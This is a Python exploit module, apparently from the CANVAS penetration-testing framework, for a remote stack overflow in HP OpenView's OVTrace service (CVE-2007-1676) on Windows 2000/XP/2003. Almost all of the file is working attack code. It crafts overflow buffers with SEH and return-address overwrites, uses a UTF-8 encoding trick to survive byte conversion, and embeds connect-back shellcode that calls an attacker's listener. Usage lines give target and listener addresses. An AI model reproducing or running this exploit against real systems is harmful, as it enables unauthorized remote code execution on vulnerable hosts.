#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2007
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import getopt
import socket
import time
import struct

# CANVAS modules
from exploitutils import *
from tcpexploit import *
from MOSDEF import mosdef

# GUI info
NAME='HP OpenView Trace Service Overflow'
DESCRIPTION='HP OpenView Trace Service OVTrace.exe Stack Overflow'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="HP"
DOCUMENTATION['Date public']='08/14/07'
DOCUMENTATION['References']='http://dvlabs.tippingpoint.com/advisory/TPTI-07-14'
DOCUMENTATION['Repeatability']=''
DOCUMENTATION['VersionsAffected']=''
DOCUMENTATION['CVE Name'] = 'CVE-2007-1676'
DOCUMENTATION['CVE Url'] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-1676"


VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','XP','2003']

NOTES="""
Overflow with function 0x1a is quite interesting. The buffer read from the query
is supposed to be UTF-8. Thanks to MultiByteToWideChar, it is converted to a
Unicode buffer, which is then converted back to a multibyte ANSI string. Even when
encoding the string correctly, we will lose in the conversions the following bytes:
[0x80,0x82-0x8c,0x8e,0x91-0x9c,0x9e-0x9f] (at least under 2000)
There is a small trick involved that relies on building a Unicode string with the
valid widechars for the bytes in this range, and then encoding it to UTF-8.

Another trick used is that ecx is set to the beginning of our buffer before a call
to gethostbyname(). Under 2000, ecx is unchanged after the call, so we can use a
jmp ecx. Unfortunately under 2003, ecx is changed by the call so the jmp ecx trick
will not work anymore. A jmp esp can do the job, but there is none generic enough.

Tested on:
HP OpenView Operations A.07.50 on Windows 2000 Advanced Server SP4 French OOTB

Usage:
./commandlineInterface.py -v 1 -p 5555
./exploits/openview_trace/openview_trace.py -v 1 -t 10.10.13.20 -l 10.10.13.1 -d 5555
"""

CHANGELOG="""
"""

targets={
    0: ['Autodetect',0],
    1: ['HP OpenView Operations A.07.50 on Windows',[0x78010394,0x7ffd2767]]
}

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.setInfo(DESCRIPTION)
        self.name=NAME
        self.port=5051
        self.version=0
        self.autoversion=0
        self.badstring='\0'
        self.function=0x1a #0xf
        self.subesp=1000
        return

    def neededListenerTypes(self):
        import canvasengine
        return [canvasengine.WIN32MOSDEF]

    def createShellcode(self):
        return self.createSmallWin32Shellcode(self.callback.ip,self.callback.port,self.subesp)

    def getArgs(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get('port',self.port))
        return

    def test(self):
        self.getArgs()
        self.log('%s testing host %s:%s'%(self.name,self.host,self.port))
        s=self.gettcpsock()
        s.set_timeout(4)
        try:
            s.connect((self.host,self.port))
        except:
            self.log('No connection could be established')
            return 0        
        return 1

    def encodeBuffer(self,buffer):
        chararray=[0x20ac,0x81,0x201a,0x192,0x201e,0x2026,0x2020,0x2021,0x2c6,0x2030,0x160,0x2039,0x152,0x8d,0x17d,0x8f,0x90,0x2018,0x2019,0x201c,0x201d,0x2022,0x2013,0x2014,0x2dc,0x2122,0x161,0x203a,0x153,0x9d,0x17e,0x178]
        data=''
        for i in range(len(buffer)):
            b=ord(buffer[i])
            if b>=0x80 and b<0xa0:
                h=chararray[b-0x80]
            else:
                h=b
            data+=struct.pack('<H',h)
        return data

    def run(self):
        self.getArgs()
        self.setInfo('%s attacking %s:%d (in progress)'%(NAME,self.host,self.port))
        if self.version==0:
            self.test()
            if self.version==0:
                self.log('Could not determine version automatically')
                self.setInfo('%s attacking %s:%d - done (failed!)'%(NAME,self.host,self.port))
                return 0
        self.info,self.eip=targets[self.version]
        self.log('Attacking %s:%d'%(self.host,self.port))

        data=''
        buffer=''
        buffer+=struct.pack('>B',self.function)
        if self.function==0xf: #not very reliable, will only work on 2000 ~SP4
            data+='A'*0x3e
            data+='\xeb\x12' #jmp forward
            data+='BB'
            data+=struct.pack('<L',self.eip[0]) #SEH
            data+='C'*8
            data+='DDD\xff' #access violation
            data+=self.shellcode
            buffer+=struct.pack('>H',0x10)
            buffer+='E'*0x10
            buffer+=struct.pack('>H',len(data))
            buffer+=data
            buffer+=struct.pack('>LL',0x0,0x0)
        elif self.function==0x1a: #a bit better
            data+='AA' #fool isalpha() to keep ecx pointing here
            data+='\xff\xe4' #jmp esp
            data+='B'*0xfc
            data+=struct.pack('<L',self.eip[1])
            data+='C'*0xc
            data+='\xeb\x6e'
            data+='D'*0x6e
            data+=self.shellcode
            utf8data=UTF16toUTF8(self.encodeBuffer(data))
            buffer+=struct.pack('>L',0x0)
            buffer+=struct.pack('>H',len(utf8data))
            buffer+=utf8data
            buffer+=struct.pack('>H',0x0)

        s=self.gettcpsock()
        s.connect((self.host,self.port))
        s.send(buffer)
        time.sleep(10) #can be a bit long due to gethostbyaddr() call
        if self.ISucceeded():
            self.setInfo('%s attacking %s:%d - done (success!)'%(NAME,self.host,self.port))
            return 1
        else:
            self.setInfo('%s attacking %s:%d - done (failed)'%(NAME,self.host,self.port))
            return 0

    def displayVersions(self):
        i=0
        print 'Available versions:'
        for listline in targets.values():
            print '\t%d: %s'%(i,listline[0])
            i+=1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v%s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
